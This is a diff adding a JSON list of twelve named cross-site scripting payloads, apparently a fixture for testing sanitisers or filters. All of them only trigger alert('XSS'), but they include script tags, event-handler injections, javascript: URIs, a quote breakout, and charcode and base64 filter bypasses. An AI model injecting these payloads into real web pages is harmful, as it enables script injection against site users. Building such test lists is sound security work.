@@ -1,0 +1,50 @@
+[
+  {
+    "name": "script_alert",
+    "payload": "<script>alert('XSS')</script>"
+  },
+  {
+    "name": "img_onerror",
+    "payload": "<img src=x onerror=alert('XSS')>"
+  },
+  {
+    "name": "javascript_uri",
+    "payload": "javascript:alert('XSS')"
+  },
+  {
+    "name": "quote_breakout",
+    "payload": "\"'><script>alert('XSS')</script>"
+  },
+  {
+    "name": "svg_onload",
+    "payload": "<svg onload=alert('XSS')>"
+  },
+  {
+    "name": "charcode_bypass",
+    "payload": "';alert(String.fromCharCode(88,83,83))//'"
+  },
+  {
+    "name": "details_ontoggle",
+    "payload": "<details open ontoggle=alert('XSS')>"
+  },
+  {
+    "name": "iframe_js",
+    "payload": "<iframe src=javascript:alert('XSS')>"
+  },
+  {
+    "name": "math_xlink",
+    "payload": "<math><mi xlink:href=\"javascript:alert('XSS')\">"
+  },
+  {
+    "name": "body_onload",
+    "payload": "<body onload=alert('XSS')>"
+  },
+  {
+    "name": "event_handler",
+    "payload": "<div onmouseover=alert('XSS')>Hover me</div>"
+  },
+  {
+    "name": "base64_bypass",
+    "payload": "<script src=data:text/javascript;base64,YWxlcnQoJ1hTUycp></script>"
+  }
+]
